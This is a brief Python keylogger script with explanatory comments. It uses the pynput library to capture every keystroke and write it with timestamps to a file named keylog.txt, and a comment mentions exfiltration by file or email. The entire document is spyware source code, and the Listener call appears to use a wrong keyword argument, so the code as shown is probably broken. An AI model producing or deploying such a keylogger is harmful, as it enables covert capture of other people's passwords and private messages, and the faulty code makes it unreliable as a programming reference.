# Import required libraries
import pynput  # This helps us read keystrokes as user types
# This will log keystrokes and allow for different means of exfiltration (file, email, etc)
import logging
from pynput.keyboard import Key, Listener

# Create the configuration for how we're going to log our keystrokes (file and format)
logging.basicConfig(filename=("keylog.txt"),
                    level=logging.DEBUG, format=" %(asctime)s - %(message)s")

# Define the function that will take in the keystroke and log it


def on_key_press(key):
    logging.info(str(key))


# Create the listener that will be triggered whenever input is received, and pass input to the on_key_press function to log it
# Pass in function we just made as the argument
with Listener(on_key_press=on_key_press) as listener:
    listener.join()
